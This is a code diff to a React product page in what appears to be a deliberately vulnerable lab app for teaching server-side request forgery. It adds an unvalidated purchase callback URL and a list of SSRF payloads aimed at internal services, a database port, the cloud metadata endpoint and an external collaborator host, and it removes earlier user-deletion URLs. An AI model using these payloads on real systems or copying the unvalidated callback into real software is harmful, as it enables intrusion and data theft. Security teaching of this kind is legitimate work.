@@ -9,6 +9,7 @@ function ProductDetail() {
   const [quantity, setQuantity] = useState(null);
   const [loading, setLoading] = useState(true);
   const [ssrfUrl, setSsrfUrl] = useState('');
+  const [purchaseCallback, setPurchaseCallback] = useState('');
 
   useEffect(() => {
     loadProduct();
@@ -34,9 +35,7 @@ function ProductDetail() {
     
     // Call inventory service to get quantity
     try {
-      // Use ssrfUrl if provided (SSRF vulnerability demonstration)
-      const callbackUrl = ssrfUrl || null;
-      const response = await inventoryServiceAPI.getInventory(id, size, callbackUrl);
+      const response = await inventoryServiceAPI.getInventory(id, size);
       setQuantity(response.data.quantity);
     } catch (error) {
       console.error('Error getting inventory:', error);
@@ -44,18 +43,47 @@ function ProductDetail() {
     }
   };
 
-  const exploitSSRF = async () => {
-    if (!ssrfUrl) {
-      alert('Please enter a callback URL');
+  // SSRF Attack 1: Purchase with malicious callback
+  const handlePurchase = async () => {
+    if (!selectedSize) {
+      alert('Please select a size');
       return;
     }
-    
+
     try {
-      await inventoryServiceAPI.getInventory(id, selectedSize, ssrfUrl);
-      alert('SSRF request sent! Check inventory service logs.');
+      const purchaseData = {
+        product_id: id,
+        size: selectedSize,
+        quantity: 1
+      };
+
+      // SSRF: Add callback URL if provided
+      if (purchaseCallback) {
+        purchaseData.callback_url = purchaseCallback;
+      }
+
+      const response = await inventoryServiceAPI.purchase(purchaseData);
+      alert(`Purchase successful! New quantity: ${response.data.new_quantity}`);
+      setQuantity(response.data.new_quantity);
     } catch (error) {
-      console.error('SSRF exploit error:', error);
+      console.error('Purchase error:', error);
+      alert('Purchase failed');
     }
+  };
+
+  const exploitSSRFPurchase = () => {
+    // Demo SSRF payloads for purchase callback
+    const payloads = [
+      'http://localhost:8081/api/users/1',           // Internal user service
+      'http://localhost:8082/admin/products/',       // Internal admin panel
+      'http://localhost:5433',                       // PostgreSQL user DB
+      'http://169.254.169.254/latest/meta-data/',    // AWS metadata
+      'http://192.168.1.1:8080/admin',               // Internal network
+      'http://burp-collaborator.example.com'         // External callback
+    ];
+    
+    const randomPayload = payloads[Math.floor(Math.random() * payloads.length)];
+    setPurchaseCallback(randomPayload);
   };
 
   if (loading) {
@@ -100,33 +128,46 @@ function ProductDetail() {
         </div>
       )}
 
-      {/* SSRF Vulnerability Demo Section */}
+      {/* SSRF Demo: Purchase with Callback */}
       <div className="ssrf-demo">
-        <h4>⚠️ SSRF Vulnerability Demo</h4>
+        <h4>🔓 SSRF Demo: Purchase with Callback</h4>
         <p>
-          This section demonstrates an SSRF vulnerability. You can provide a callback URL 
-          that will be fetched by the inventory service when checking stock.
+          <strong>Realistic Scenario:</strong> Sau khi mua hàng, inventory service gửi callback 
+          để thông báo cho payment gateway hoặc warehouse system.
         </p>
+        
+        <button onClick={exploitSSRFPurchase} className="btn btn-warning">
+          Generate Random SSRF Payload
+        </button>
+
         <div className="form-group">
-          <label>Callback URL (for SSRF exploit):</label>
+          <label>🎯 Payment Callback URL (SSRF):</label>
           <input
             type="text"
-            value={ssrfUrl}
-            onChange={(e) => setSsrfUrl(e.target.value)}
-            placeholder="e.g., http://user-service:8081/api/users/delete/1"
+            value={purchaseCallback}
+            onChange={(e) => setPurchaseCallback(e.target.value)}
+            placeholder="http://payment-gateway.internal/webhook"
           />
+          <small>⚠️ Server sẽ gửi GET request đến URL này sau khi trừ kho</small>
         </div>
-        <button onClick={exploitSSRF} className="btn btn-danger">
-          Trigger SSRF Attack
+
+        <button 
+          onClick={handlePurchase} 
+          className="btn btn-primary"
+          disabled={quantity === 0}
+        >
+          {purchaseCallback ? '🎯 Purchase (with SSRF)' : 'Purchase'}
         </button>
         
-        <div style={{ marginTop: '1rem', fontSize: '0.9rem' }}>
-          <p><strong>Example exploit URLs:</strong></p>
-          <code>http://user-service:8081/api/users/delete/1</code>
-          <code>http://user-service:8081/api/users/delete/2</code>
-          <p style={{ marginTop: '0.5rem', color: '#856404' }}>
-            This will make the inventory service send a DELETE request to the user service, 
-            potentially deleting a user without proper authentication!
+        <div style={{ marginTop: '1rem', fontSize: '0.9rem', background: '#fff3cd', padding: '1rem', borderRadius: '4px' }}>
+          <p><strong>Example SSRF Targets:</strong></p>
+          <ul style={{ margin: '0.5rem 0', paddingLeft: '1.5rem' }}>
+            <li><code>http://localhost:8081/api/users</code> - Internal user service</li>
+            <li><code>http://localhost:5433</code> - PostgreSQL database</li>
+            <li><code>http://169.254.169.254/latest/meta-data/</code> - Cloud metadata</li>
+          </ul>
+          <p style={{ color: '#856404', marginTop: '0.5rem' }}>
+            ⚠️ Inventory service sẽ thực hiện request mà không validate URL!
           </p>
         </div>
       </div>
